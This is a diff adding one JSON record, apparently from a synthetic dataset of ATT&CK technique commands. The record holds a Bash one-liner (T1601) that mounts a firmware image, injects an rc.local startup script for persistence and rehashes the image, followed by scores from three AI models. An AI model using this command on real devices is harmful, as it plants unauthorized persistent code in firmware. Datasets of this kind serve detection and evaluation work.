@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "LOOP=$(losetup -f --show /root/firmware_mod.img) && MNT=$(mktemp -d) && mount $LOOP $MNT && cp /root/rc.local $MNT/etc/rc.local && chmod +x $MNT/etc/rc.local && umount $MNT && losetup -d $LOOP && rmdir $MNT && sha256sum /root/firmware_mod.img",
+  "explanation": "Mounts a firmware image, injects a startup script to ensure persistence, then recomputes the image hash to track the altered content.",
+  "rationale_steps": [
+    "Loop-mount the firmware image to enable offline modification.",
+    "Insert unauthorized initialization logic for persistence at boot.",
+    "Recompute hash to record the modified image's integrity for later checks."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-dc873ff7-4bdadf88",
+  "source_prompt_hash": "dc873ff7",
+  "timestamp_utc": "2025-09-30T04:57:26.660610Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper variable assignments, command separators (&&), balanced quotes, valid flags for losetup/mount/chmod, and follows a logical sequence with no syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements the T1601 technique by mounting a firmware image, modifying it by injecting a persistence mechanism (rc.local startup script), unmounting cleanly, and calculating a new checksum to track the modified image.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T19:03:39.425966Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct variable assignments, command substitutions, logical operators, and valid flags for each utility.",
+        "semantic_score": 1,
+        "semantic_justification": "The command fundamentally fails to achieve its claimed intent of modifying a firmware image because the critical `losetup` and `mount` operations require root privileges, contradicting the stated 'Privilege: None'.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T19:03:50.692444Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash using valid command substitution, chaining with &&, and appropriate flags with no quoting or balancing issues.",
+        "semantic_score": 4,
+        "semantic_justification": "It loop-mounts and modifies a firmware filesystem to add rc.local persistence and then hashes the image (consistent with T1601), but it assumes root privileges and a directly mountable filesystem without partition handling, which may not hold for many network device images.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T19:04:06.639973Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
